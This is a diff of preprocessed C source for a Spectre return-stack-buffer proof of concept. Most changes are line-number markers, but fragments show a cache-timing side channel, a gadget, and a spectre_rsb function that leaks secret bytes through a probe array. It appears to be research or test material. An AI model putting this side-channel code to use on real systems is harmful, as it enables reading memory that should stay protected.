@@ -4264,7 +4264,9 @@ extern int pthread_atfork (void (*__prepare) (void),
 
 
 
-# 12 "source.c"
+
+
+# 14 "source.c"
 volatile uint64_t counter = 0;
 uint64_t miss_min = 0;
 uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
@@ -4324,7 +4326,7 @@ uint64_t measure_latency()
 
     return min;
 }
-# 94 "source.c"
+# 96 "source.c"
 void gadget()
 {
 
@@ -4343,10 +4345,7 @@ void spectre_rsb(size_t malicious_offset)
 {
     j = malicious_offset;
     gadget();
-
-
-
-
+# 122 "source.c"
     garbage ^= channel[secret[j] * 512];
 }
 
@@ -4419,19 +4418,19 @@ int main()
 {
     pthread_t inc_counter_thread;
     if (pthread_create(&inc_counter_thread, 
-# 187 "source.c" 3 4
+# 193 "source.c" 3 4
                                            ((void *)0)
-# 187 "source.c"
+# 193 "source.c"
                                                , inc_counter, 
-# 187 "source.c" 3 4
+# 193 "source.c" 3 4
                                                               ((void *)0)
-# 187 "source.c"
+# 193 "source.c"
                                                                   ))
     {
         fprintf(
-# 189 "source.c" 3 4
+# 195 "source.c" 3 4
                stderr
-# 189 "source.c"
+# 195 "source.c"
                      , "Error creating thread\n");
         return 1;
     }
@@ -4445,14 +4444,14 @@ int main()
     if (miss_min == 0)
     {
         fprintf(
-# 201 "source.c" 3 4
+# 207 "source.c" 3 4
                stderr
-# 201 "source.c"
+# 207 "source.c"
                      , "Unreliable access timing\n");
         exit(
-# 202 "source.c" 3 4
+# 208 "source.c" 3 4
             1
-# 202 "source.c"
+# 208 "source.c"
                         );
     }
     miss_min -= 1;
